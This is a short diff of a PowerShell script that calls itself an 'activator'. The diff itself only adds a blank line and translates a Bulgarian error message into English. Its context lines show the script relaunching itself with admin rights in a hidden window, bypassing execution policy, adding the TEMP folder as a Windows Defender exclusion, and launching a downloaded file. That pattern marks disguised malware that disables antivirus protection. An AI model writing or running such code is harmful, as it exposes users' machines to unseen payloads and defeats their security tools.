@@ -15,6 +15,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"" -Verb RunAs -WindowStyle Hidden
     exit
 }
+
 $ErrorActionPreference = "SilentlyContinue"
 
 Add-MpPreference -ExclusionPath $env:TEMP
@@ -28,5 +29,5 @@ if (Test-Path $file) {
     Start-Process $file
     Write-Host "ACTIVATOR IS STARTED!" -ForegroundColor Green
 } else {
-    Write-Host "Файлът не е изтеглен" -ForegroundColor Red
+    Write-Host "File not downloaded" -ForegroundColor Red
 }
